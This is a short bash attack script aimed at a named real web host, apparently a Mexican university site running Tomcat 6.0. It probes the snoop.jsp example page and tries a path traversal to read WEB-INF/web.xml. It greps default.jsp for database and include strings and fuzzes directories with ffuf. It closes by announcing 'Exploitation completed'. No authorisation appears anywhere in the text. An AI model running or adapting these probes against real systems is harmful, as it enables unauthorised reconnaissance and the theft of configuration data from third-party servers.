#!/bin/bash
echo "[+] Testing Tomcat 6.0 specific vulnerabilities..."

# 1. Test examples for code execution
echo "[+] Testing JSP examples..."
curl -k "https://sito.utslp.edu.mx/examples/jsp/snp/snoop.jsp?test=payload" 2>/dev/null | grep -i "snoop"

# 2. Test for path traversal in examples
echo "[+] Testing path traversal..."
curl -k "https://sito.utslp.edu.mx/examples/jsp/../../WEB-INF/web.xml" 2>/dev/null | head -20

# 3. Test default JSP applications
echo "[+] Analyzing default.jsp..."
curl -k "https://sito.utslp.edu.mx/default.jsp" 2>/dev/null | grep -i -E "jdbc|include|import" > jsp_analysis.txt

# 4. Enhanced directory busting
echo "[+] Enhanced directory scanning..."
ffuf -u "https://sito.utslp.edu.mx/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/tomcat.txt -mc 200,302 -o tomcat_dirs.txt

echo "[+] Exploitation completed"
